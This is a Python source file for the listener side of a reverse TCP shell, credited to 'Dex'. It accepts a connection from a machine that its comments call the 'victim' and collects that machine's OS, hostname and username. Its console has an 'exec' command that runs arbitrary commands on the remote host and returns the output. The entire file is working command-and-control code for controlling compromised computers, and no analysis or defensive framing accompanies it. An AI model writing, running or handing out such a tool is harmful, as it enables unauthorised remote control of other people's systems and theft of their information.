import socket,getopt,os,sys


def usage():

	print("\nReverse TCP (Server) by Dex")
	print()
	print("Usage: server.py -i <ip to listen on> -p <port>")
	print("Example: server.py -i 192.168.0.60 (internal ip) -p 8000")
	print("Example: server.py -i 53.63.215.73 (external ip) -p 1337")
	sys.exit(0)

def main():

	host = ''
	port = 0

	if not len(sys.argv[1:]):
		usage()

	try:
		opts, args = getopt.getopt(sys.argv[1:], "hi:p:",["help","port="])
	except getopt.GetoptError as err:
		print(str(err))
		usage()

	for o,a in opts:
		if o in ("-h","--help"):
			usage()
		elif o in ("-i","--ip"):
			host = str(sys.argv[2])
		elif o in("-p","--port"):
			try:
				port = int(sys.argv[4])
			except:
				exit("[!] Port parameter requires number.\n%s was supplied." % (port))
		else:
			assert False,"Unhandled Option"

	listener(host,port)

def listener(host,port):

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

	s.bind((host,port))
	s.listen(1)

	print("Listening on %s:%d" % (host, port))

	try:
		conn, addr = s.accept()
	except KeyboardInterrupt:
		print("[*] User Requested Interrupt.")
		sys.exit(0)

	console(conn, addr)

	s.close()

def console(conn, addr):
	print("Connection established from %s" % (str(addr[0])))

	# receives sysinfo sent by victim upon connection
	sysinfo = conn.recv(2048)
	sysinfo = sysinfo.decode('utf-8')
	sysinfo = sysinfo.split(",")

	# puts it all into one little handy string.
	x_info = 'Operating System: '+ '%s\n' % (sysinfo[0])
	x_info += 'Computer Name: '+ '%s\n' % (sysinfo[1])
	x_info += 'Kernel Version: '+ '%s\n' % (sysinfo[2])
	x_info += 'Release Version: '+ '%s\n' % (sysinfo[3])
	x_info += 'System Version: '+ '%s\n' % (sysinfo[4])
	x_info += 'Username:'+ '%s\n' % (sysinfo[5])

	while 1:
		comminput = input("> ")

		if comminput == "exec":
			comminput = comminput.encode('utf-8')
			conn.send(comminput)
			execinput = input("[*] Enter command to execute: ")

			# preps input for sending across to victim.
			execinput = execinput.encode('utf-8')
			conn.send(execinput)

			# decodes result as string.
			result = conn.recv(1024)
			result = result.decode('utf-8')
			print(result)

		elif comminput == "clear":
			os.system("clear")
		elif comminput == "help":
			help_list = {}
			help_list["exec"] = "Execute argument as command on Remote Host"
			help_list["sysinfo"] = "Display Remote System Information"
			help_list["exit"] = "Sends exit command to Remote Host then exits"
			help_list["clear"] = "Clears the terminal"
			help_list["help"] = "Displays this help message"

			returned = ("\n Command") + " - "
			returned += ("Description\n" + ("-" * 50))

			for x in sorted(help_list):
				dec = help_list[x]
				returned += "\n  " + x + " - " + dec + "\n"
			print(returned.rstrip("\n"))
		elif comminput == "sysinfo":
			print(x_info)
		elif comminput == "exit":
			comminput = comminput.encode('utf-8')
			conn.send(comminput)

			break
		else:
			print("[!] Unknown Command")


	conn.close()

if __name__ == "__main__":
	main()
